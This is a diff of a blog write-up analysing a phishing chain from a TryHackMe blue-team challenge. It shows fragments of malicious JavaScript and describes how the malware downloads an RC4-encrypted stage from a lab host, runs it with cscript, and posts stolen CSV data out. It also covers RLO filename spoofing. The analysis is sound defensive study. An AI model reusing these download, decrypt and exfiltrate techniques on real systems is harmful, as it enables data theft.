@@ -6,17 +6,17 @@ tags: ["downtime", "medium", "malware", "network", "thm"]
 section: "blue"
 draft: False
 coverImage:
-  src: "/public/images/DownTimeTHM/waiting_room_thumbnail.png"
+  src: "/images/DownTimeTHM/waiting_room_thumbnail.png"
   alt: "thumbnail"
 ---
 In this write-up, I walk through to a challenge from TryHackMe’s [Downtime](https://tryhackme.com/room/thewaitingroom) event, tracing the attack from a phishing attachment to data exfiltration.
 <br>
-![sumary](/public/images/DownTimeTHM/brief.png)
+![sumary](/images/DownTimeTHM/brief.png)
 
 ## 1. Attack Chain Analysis
-![email](/public/images/DownTimeTHM/eml.png)
+![email](/images/DownTimeTHM/eml.png)
 The email contains attachment `Remittance.one` and in this `Microsoft OneNote`, I found suspicious javascript
-![hta](/public/images/DownTimeTHM/malicious_script.png)
+![hta](/images/DownTimeTHM/malicious_script.png)
 ```js
 var entries = [
     "746a6174750b17617475716d6d69170f1709",
@@ -132,7 +132,7 @@ function loadReceipt() {
 ```
 This script downloads an encrypted payload disguised as PNG file from `http://portal.meridian.thm:8080/assets/remittance-v2.png` then decrypt using `RC4` with the key `3c7a8c88466f5b869bea15f333e3be01` and saves it as `%LOCALAPPDATA%\Meridian\receipt.js` and executes it using `cscript.exe //B //Nologo`, with `MR-6106-028` as an argument.
 
-![pcap](/public/images/DownTimeTHM/pcap.png)
+![pcap](/images/DownTimeTHM/pcap.png)
 From `incident.pcap` extracting and decrypt `remittance-v2.png` then we got another js file:
 ```js
 var args = WScript.Arguments;
@@ -248,7 +248,7 @@ request.send(envelope);
 ```
 The script reads `payment-register.csv`, encrypts its contents using `RC4` with previous key, and Base64-encodes the result. It then sends the data, along with the computer name and username, via an HTTP POST request to `http://portal.meridian.thm:8080/api/receipt`.
 Extract the data field from the JSON file, decode it from Base64, then decrypt it using RC4 with the hex key 3c7a8c88466f5b869bea15f333e3be01.
-![cyberchef](/public/images/DownTimeTHM/cyberchef.png)
+![cyberchef](/images/DownTimeTHM/cyberchef.png)
 
 ## 2. Indicators of Compromise
 | Type | Indicator |
@@ -286,13 +286,13 @@ e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3
 ```
 Answer: `e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3`
 ### Q2: Which Unicode code point was used to disguise that attachment’s displayed filename? 
-![utf](/public/images/DownTimeTHM/utf.png)
+![utf](/images/DownTimeTHM/utf.png)
 The UTF-16LE output shows the attachment split into `Remittance_` and `fdp.hta` suggesting a non printable character between them. This is consistent with `Right-to-Left Override` (RLO) filename spoofing: inserting `U+202E` before `fdp.hta` which can make the filename appear as `Remittance_ath.pdf`.
 Answer: `U+202E`
 ### Q3: Which hostname served the downloaded stage?
 Answer: `portal.meridian.thm`
 ### Q4: What was the process ID of the interpreter that executed the downloaded script?
-![execute](/public/images/DownTimeTHM/execute.png)
+![execute](/images/DownTimeTHM/execute.png)
 Answer: `1996`
 ### Q5: What encryption key protected the document transferred from the workstation?
 Answer: `3c7a8c88466f5b869bea15f333e3be01`
